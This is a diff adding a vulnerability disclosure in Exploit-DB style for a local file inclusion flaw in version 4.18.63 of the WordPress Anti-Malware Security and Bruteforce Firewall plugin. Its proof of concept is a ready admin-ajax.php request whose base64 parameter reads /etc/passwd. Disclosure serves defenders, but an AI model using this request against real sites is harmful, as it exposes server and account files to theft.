@@ -1,0 +1,26 @@
+# Exploit Title: Wordpress Anti-Malware Security and Bruteforce Firewall - Local File Inclusion
+# Google Dork: N/A
+# Date: 03 / 26 / 2019
+# Exploit Author: Ali S. Ahmad (S4R1N)
+# Vendor Homepage: N/A
+# Software Link: https://wordpress.org/plugins/gotmls/
+# Version: (Version 4.18.63)
+# Tested on: Debian GNU/Linux 9 (Docker)
+# CVE : N/A
+***********************************************************************
+Discovered By: Ali S. Ahmad (S4R1N) 03 / 26 / 2019
+***********************************************************************
+A local file inclusion bug was discovered on the Wordpress Anti-Malware Security and Bruteforce Firewall (Version 4.18.63) plugin. 
+This bug affects the file scan functionality of the plugin and can be exploited by any authenticated user (from subscriber to admin) simply by modifying the GOTMLS_scan= with a base64 encoded path to the file the attacker is trying to read. (example : GOTMLS_scan=L2V0Yy9wYXNzd2Q)
+***********************************************************************
+Tools used : 
+Attacker OS : Fedora 29 
+Victim OS : Debian GNU/Linux 9 (running on docker)
+Manual Testing tool : Burp Repeater / Browser
+***********************************************************************
+Proof of Concept (PoC):
+
+Step 1 - Log into Wordpress instance
+Step 2 - Go to /wp-admin/admin-ajax.php?action=GOTMLS_scan&GOTMLS_mt=32fd564ad6974510e6bcd22815853f3d&mt=1553627072.7669&page=GOTMLS-settings&GOTMLS_scan=<base64 encoded file path>
+
+URL : the following should yeild the contents of /etc/passwd /wp-admin/admin-ajax.php?action=GOTMLS_scan&GOTMLS_mt=32fd564ad6974510e6bcd22815853f3d&mt=1553627072.7669&page=GOTMLS-settings&GOTMLS_scan=L2V0Yy9wYXNzd2Q
